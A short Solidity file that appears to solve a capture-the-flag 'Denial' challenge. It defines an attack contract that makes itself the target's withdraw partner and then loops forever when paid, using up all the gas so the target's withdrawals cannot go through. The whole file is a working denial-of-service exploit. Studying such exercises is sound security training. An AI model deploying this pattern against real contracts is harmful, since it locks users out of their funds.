// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDenial {
    function setWithdrawPartner(address _partner) external;

    function withdraw() external;
}

contract DenialAttack {
    IDenial target;

    constructor(address _target) {
        target = IDenial(_target);
    }

    receive() external payable {
        // Invoke Out of gas error
        while (true) {}
    }

    function pwn() external {
        target.setWithdrawPartner(address(this));
    }
}
